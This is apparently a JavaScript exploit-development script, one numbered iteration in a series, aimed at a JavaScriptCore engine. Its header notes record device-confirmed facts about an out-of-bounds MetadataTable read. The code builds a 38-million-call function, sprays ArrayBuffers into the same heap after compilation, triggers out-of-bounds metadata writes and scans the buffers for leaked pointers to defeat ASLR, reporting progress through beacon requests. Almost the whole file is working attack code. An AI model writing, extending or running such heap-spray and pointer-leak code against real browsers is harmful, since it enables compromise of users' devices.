// p150d — MetadataTable overflow: post-compile zeroed spray
//
// FACTS (device-confirmed):
// - p149g: NO corruption after compile, ONLY during execution
// - p150a: Crash at call 894-999 (first OOB metadata reads)
// - Metadata buffer = 100096 bytes via FastMalloc (marge bitfit)
// - OOB at index >= 893: offset = index * 112 > 100096
// - LLInt reads CallLinkInfo at each OOB entry; if garbage → crash
//
// KEY INSIGHT: Spray AFTER compile, BEFORE call.
// p149g proved buffer is allocated during compile. If we spray zeroed
// ABs immediately after compile, they land at higher addresses
// (libpas marge tier sequential), right where OOB reads will go.
//
// ArrayBuffer and MetadataTable both use FastMalloc → same libpas heap.
// Zeroed data = null CallLinkInfo pointers = LLInt slow path = safe.
// Slow path WRITES resolved target into metadata entry (our spray).
//
// Beacon prefix: V150D-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150D-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150D-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  BS('BOOT');

  var BUF_SZ = 100096;
  var THROW_AT = 950;

  // Keep reference arrays
  var postSprays = [];
  var postViews = [];

  // ---- PHASE 1: Build the 38M op_call function ----
  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p150fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p150ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  var blobMB = Math.round(blob.size / 1048576);
  BS('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p150ok ? 'OK' : 'FAIL';
    BS('COMPILED-' + ok);
    if (ok === 'OK') phaseSpray();
  };
  document.head.appendChild(sc);
  sc.src = url;

  // ---- PHASE 2: Post-compile spray ----
  // MetadataTable was just allocated during compile.
  // Spray zeroed ABs of same size IMMEDIATELY after.
  // libpas marge tier allocates sequentially → high probability
  // that spray ABs are adjacent to (or overlapping with) the
  // metadata buffer's OOB region.
  function phaseSpray() {
    BS('SPRAY-START');

    // Spray 200 zeroed ABs of same size as metadata buffer
    // libpas marge tier allocates sequentially — these should
    // land adjacent to the metadata buffer
    for (var i = 0; i < 200; i++) {
      var ab = new ArrayBuffer(BUF_SZ);
      postSprays.push(ab);
      postViews.push(new Uint8Array(ab));
    }
    BS('SPRAY-200');

    // Small delay for allocator to settle, then call
    setTimeout(phaseCall, 100);
  }

  // ---- PHASE 3: Call with throwing callback ----
  function phaseCall() {
    BS('CALL-START-THROW-' + THROW_AT);

    var callCount = 0;
    try {
      window.__p150fn(function() {
        callCount++;
        if (callCount === 1) BS('M-1');
        if (callCount === 100) BS('M-100');
        if (callCount === 500) BS('M-500');
        if (callCount === 890) BS('M-890');
        if (callCount === 891) BS('M-891');
        if (callCount === 892) BS('M-892');
        if (callCount === 893) BS('M-893-LAST-INBOUNDS');
        if (callCount === 894) BS('M-894-FIRST-OOB');
        if (callCount === 895) BS('M-895');
        if (callCount === 896) BS('M-896');
        if (callCount === 897) BS('M-897');
        if (callCount === 898) BS('M-898');
        if (callCount === 899) BS('M-899');
        if (callCount === 900) BS('M-900');
        if (callCount === 920) BS('M-920');
        if (callCount === 940) BS('M-940');

        if (callCount >= THROW_AT) {
          throw new Error('p150d-bail');
        }
      });
      BS('ALL-DONE-' + callCount);
    } catch (e) {
      BS('THREW-' + callCount);
    }

    BS('TOTAL-' + callCount);
    if (callCount > 0) {
      setTimeout(phaseScan, 50);
    } else {
      BS('ZERO-CALLS');
    }
  }

  // ---- PHASE 4: Scan for written pointers ----
  function phaseScan() {
    BS('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;

    for (var i = 0; i < postViews.length; i++) {
      var view = postViews[i];
      if (!view) continue;

      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        BS('HIT-' + i + '-nz' + nz + '-f' + firstOff);

        // Dump metadata-aligned entries (112-byte stride)
        var dumped = 0;
        for (var off = 0; off + 112 <= view.length && dumped < 5; off += 112) {
          var hasData = false;
          for (var c = off; c < off + 16; c++) {
            if (view[c] !== 0) { hasData = true; break; }
          }
          if (!hasData) continue;
          dumped++;

          // Extract 8-byte potential pointers at each 8-byte offset
          var ptrs = '';
          for (var p = 0; p < 112 && p + 8 <= view.length - off; p += 8) {
            var anyByte = false;
            for (var v = 0; v < 8; v++) {
              if (view[off + p + v] !== 0) { anyByte = true; break; }
            }
            if (anyByte) {
              var hex8 = '';
              for (var h = 7; h >= 0; h--) hex8 += hexByte(view[off + p + h]);
              ptrs += p + ':' + hex8 + ' ';
            }
          }
          if (ptrs.length < 200) {
            BS('D' + i + '@' + off + '-' + ptrs.trim());
          } else {
            BS('D' + i + '@' + off + '-LONG-' + ptrs.substring(0, 100));
          }
        }
      }
    }

    BS('RESULT-bufs' + hitBufs + '-nz' + totalNZ);

    if (hitBufs > 0) {
      BS('ASLR-LEAK-POSSIBLE');
    } else {
      BS('NO-WRITES-DETECTED');
      // Diagnostic: check function
      BS('FN-' + (window.__p150fn ? 'EXISTS' : 'GONE'));
    }
  }
})();
